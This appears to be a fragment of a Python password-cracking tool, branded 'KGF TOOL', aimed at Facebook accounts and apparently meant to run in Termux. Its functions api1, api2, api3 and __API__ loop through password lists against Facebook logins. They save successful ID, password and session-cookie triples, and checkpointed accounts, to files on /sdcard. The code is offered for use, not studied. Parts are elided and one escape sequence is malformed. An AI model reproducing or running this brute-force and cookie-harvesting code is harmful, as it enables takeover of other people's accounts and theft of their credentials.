...
# MACK BY : JAHID HASAN 
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ IMPORT MODULES ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
print("\x1b[38;5;46m➤\x1b[1;97m WELCOME 𝗞𝗚𝗙 TOOL")
...
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LINEX ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
sys.stdout.write('\x1b]2;✘ 𝗞𝗚𝗙 ✘ XD ✘\x07')
...
myweb2 = requests.get("https://github.com/Kallanooo12/Kallan_hak/blob/main/Avrolvel1.txt").text
def apv():
	try:
		clear()
		x = requests.get("").text
		if str("upppdate") in update:
			...
			os.system(f"termux-open-url https://www.facebook.com/profile.php?id=100086270594350?text={kex}")  	
			apv()
...
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝       \x1b[38;5;46m➤ 1.0
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;46m➤{A} FACEBOOK     {R}:{A} 𝗞𝗔𝗟𝗬𝗔𝗡 𝗞𝗜𝗡𝗚
\x1b[38;5;46m➤{A} GITHUB       {R}:{A} 𝗞𝗚𝗙_𝗖𝗬𝗕𝗘𝗥
...
def Main():
        try:
                        ...
                        if oggy in ['1','01']:
                                clear();print(f'\x1b[38;5;46m➤{A} EXAMPLE {R}: {G}/sdcard/𝗳𝗶𝗹𝗲.txt ');linex()
                                ...
                                os.system('xdg-open https://facebook.com/groups/1036123894351028/');menu()
                        elif oggy in ['4','04']:
...
def api1(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r\r\x1b[38;5;46m➤{A} [{G}KGF-M1{A}|{X3}{date}{A}|{BU}{loop}{A}|{G}{len(oks)}{A}|{R}{len(cps)}{A}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r\x1b[38;5;46m➤ {A}[{G}KGF-OK{A}]{G} '+ids+f' | '+pas+'')
                open('/sdcard/KGF-FILE-M1-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                ###print(f'\r\r{R}[OGGY-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/KGF-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def api2(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r\r\x1b[38;5;46m➤{A} [{G}KGF-M2{A}|{X3}{date}{A}|{BU}{loop}{A}|{G}{len(oks)}{A}|{R}{len(cps)}{A}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                open('/sdcard/KGF-FILE-M2-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                ###print(f'\r\r{R}[OGGY-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/KGF-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def api3(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r\r\x1b[38;5;46m➤{A} [{G}KGF-M3{A}|{X3}{date}{A}|{BU}{loop}{A}|{G}{len(oks)}{A}|{R}{len(cps)}{A}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r\x1b[38;5;46m➤ {A}[{G}KGF-OK{A}]{G} '+ids+f'|'+pas+'')
                open('/sdcard/KGF-FILE-M3-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                ###print(f'\r\r{R}[OGGY-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/KGF-FILE-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def __API__(ids,passlist,tl,ck):
    global loop,oks,cps
    sys.stdout.write(f"\r\r\r\x1b[38;5;46m➤{A} [{G}KGF-RN{A}|{X3}{date}{A}|{BU}{loop}{A}|{G}{len(oks)}{A}|{R}{len(cps)}{A}]");sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Photoshop' in res:
                    if "Y" in ck:
                        ...
                        open('/sdcard/KGF-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/KGF-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
                    else:
                        print(f'\r\rx1b[38;5;46m➤ {A}[{G}KGF-OK{A}]{G} {cid} | {pas} ')
                        open('/sdcard/KGF-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/KGF-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break 
            else:
